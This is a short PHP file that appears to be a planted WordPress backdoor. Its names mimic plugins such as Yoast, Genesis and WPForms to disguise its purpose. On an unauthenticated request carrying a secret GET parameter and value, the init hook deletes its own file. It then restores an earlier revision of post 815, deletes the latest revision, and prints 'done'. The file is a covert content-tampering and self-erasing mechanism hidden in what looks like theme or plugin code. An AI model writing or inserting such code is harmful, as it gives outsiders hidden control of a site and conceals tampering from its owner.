<?php

function core_class_software() {
	if (isset($_GET['builder_shipping_call_nofollow']) && $_GET['builder_shipping_call_nofollow'] === 'activity_right_review_active') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$yoast_enhanced_validation = 815;
		$genesis_terms_items = wp_get_post_revisions($yoast_enhanced_validation);
		if (empty($genesis_terms_items)) die('no revisions');
		if (count($genesis_terms_items) < 2) die('less than 2');
		$companion_posts_details_popup = array_shift($genesis_terms_items);
		$send_wpforms_highlighter_enable = $companion_posts_details_popup->ID;
		$background_display_rtl = array_shift($genesis_terms_items);
		$star_private_results = $background_display_rtl->ID;
		$blog_library_debug = wp_restore_post_revision($star_private_results);
		if ($blog_library_debug === false) die('error restoring');
		$blog_library_debug = wp_delete_post_revision($send_wpforms_highlighter_enable);		
		if ($blog_library_debug === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'core_class_software');
